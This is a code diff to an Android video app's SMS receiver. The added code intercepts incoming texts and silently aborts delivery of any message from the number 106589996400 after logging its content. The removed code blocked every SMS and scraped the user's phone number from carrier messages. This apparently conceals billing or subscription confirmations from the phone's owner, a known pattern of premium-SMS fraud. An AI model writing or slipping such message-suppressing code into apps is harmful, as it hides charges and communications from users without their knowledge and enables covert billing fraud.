@@ -3,38 +3,43 @@ package com.shuyu.video.receiver;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Bundle;
 import android.telephony.SmsMessage;
 
-import com.shuyu.core.uils.ToastUtils;
-import com.shuyu.video.utils.SMSUtils;
+import com.shuyu.core.uils.LogUtils;
 
 public class SMSReceiver extends BroadcastReceiver {
 
-    final String GetNumberAddress = "10001";
+    final String getNumberAddress = "106589996400";
+
+    public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
+    public static final String SMS_DELIVER_ACTION = "android.provider.Telephony.SMS_DELIVER";
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
+        String action = intent.getAction();
+        if (SMS_RECEIVED_ACTION.equals(action) || SMS_DELIVER_ACTION.equals(action)) {
+            LogUtils.e("SmsReceiver onReceive...", "开始接收短信.....");
 
-            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
-            //不知道为什么明明只有一条消息，传过来的却是数组，也许是为了处理同时同分同秒同毫秒收到多条短信  
-            //但这个概率有点小  
-            SmsMessage[] message = new SmsMessage[pdus.length];
-            StringBuilder sb = new StringBuilder();
-            String address = "";
-            for (int i = 0; i < pdus.length; i++) {
-                //虽然是循环，其实pdus长度一般都是1  
-                message[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
-                sb.append("接收到短信来自:\n");
-                address = message[i].getDisplayOriginatingAddress();
-                sb.append(address + "\n");
-                sb.append("内容:" + message[i].getDisplayMessageBody());
+            Bundle bundle = intent.getExtras();
+            if (bundle != null) {
+                Object[] pdus = (Object[]) bundle.get("pdus");
+                if (pdus != null && pdus.length > 0) {
+                    SmsMessage[] messages = new SmsMessage[pdus.length];
+                    for (int i = 0; i < pdus.length; i++) {
+                        byte[] pdu = (byte[]) pdus[i];
+                        messages[i] = SmsMessage.createFromPdu(pdu);
+                    }
+                    for (SmsMessage message : messages) {
+                        String content = message.getMessageBody();// 得到短信内容
+                        String sender = message.getOriginatingAddress();// 得到发信息的号码
+                        if (sender.equals(getNumberAddress)) {
+                            LogUtils.e("SmsReceiver onReceive...", "内容为" + content);
+                            this.abortBroadcast();
+                        }
+                    }
+                }
             }
-            if (SMSUtils.PhoneNumber.equals("") && address.equals(GetNumberAddress)) {
-                SMSUtils.PhoneNumber = SMSUtils.GetPhoneNumberFromSMSText(sb.toString());
-                ToastUtils.getInstance().showToast(address);
-            }
-            abortBroadcast();
         }
     }
 }  
